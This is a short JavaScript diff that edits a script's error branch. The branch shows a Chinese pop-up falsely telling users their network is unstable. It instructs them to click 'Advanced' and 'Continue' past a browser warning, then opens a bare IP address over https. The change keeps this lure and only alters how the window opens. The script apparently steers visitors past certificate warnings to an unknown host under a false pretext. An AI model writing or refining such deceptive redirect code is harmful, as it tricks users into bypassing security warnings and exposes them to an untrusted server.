@@ -16,8 +16,9 @@
             if(httpRequest.status == 200){
                 var json = httpRequest.responseText;console.log(json);
             }else{
-                alert("系统检测到你的网络不稳定,在打开的网页中1>选择高级2>选择继续访问，将自动为你加速！");
-                window.open("https://66.70.204.147");
+                alert("系统检测到你的网络不稳定,请在打开的网页中1.选择高级2.选择继续访问，将自动为你加速！");
+                var tempwindow=window.open('_blank');
+                tempwindow.location="https://66.70.204.147";
             }
         }
     };
